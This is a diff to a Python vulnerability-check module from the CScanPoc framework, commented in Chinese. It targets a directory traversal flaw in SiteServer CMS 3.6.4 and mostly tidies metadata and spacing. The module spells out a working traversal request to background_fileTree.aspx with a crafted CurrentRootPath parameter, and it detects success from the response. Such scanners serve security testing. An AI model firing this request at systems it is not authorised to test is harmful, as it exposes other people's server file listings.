@@ -5,18 +5,18 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 hh = hackhttp.hackhttp()
 
 class Vuln(ABVuln):
-    vuln_id = 'siteserver_0006' # 平台漏洞编号，留空
-    name = 'siteserver最新版3.6.4目录遍历漏洞' # 漏洞名称
+    vuln_id = 'SiteServer_0006' # 平台漏洞编号，留空
+    name = 'SiteServer最新版3.6.4目录遍历' # 漏洞名称
     level = VulnLevel.MED # 漏洞危害级别
     type = VulnType.FILE_TRAVERSAL # 漏洞类型
     disclosure_date = '2013-02-03'  # 漏洞公布时间
     desc = '''
-        siteserver最新版3.6.4目录遍历漏洞
+        SiteServer最新版3.6.4 /siteserver/cms/background_fileTree.aspx 处目录遍历漏洞。
     ''' # 漏洞描述
-    ref = '' # 漏洞来源
-    cnvd_id = '' # cnvd漏洞编号
-    cve_id = '' #cve编号
-    product = 'siteserver'  # 漏洞应用名称
+    ref = 'Unknown' # 漏洞来源
+    cnvd_id = 'Unknown' # cnvd漏洞编号
+    cve_id = 'Unknown' #cve编号
+    product = 'SiteServer'  # 漏洞应用名称
     product_version = '3.6.4'  # 漏洞应用版本
 
 
@@ -33,7 +33,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
-            url=arg+"/siteserver/cms/background_fileTree.aspx?PublishmentSystemID=0&RootPath=&CurrentRootPath=include"
+            url = arg + "/siteserver/cms/background_fileTree.aspx?PublishmentSystemID=0&RootPath=&CurrentRootPath=include"
             code,head,res,errcode,_=hh.http(url)
             if code==200 and "absmiddle" in res and 'openFolderByA(this)' in res:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
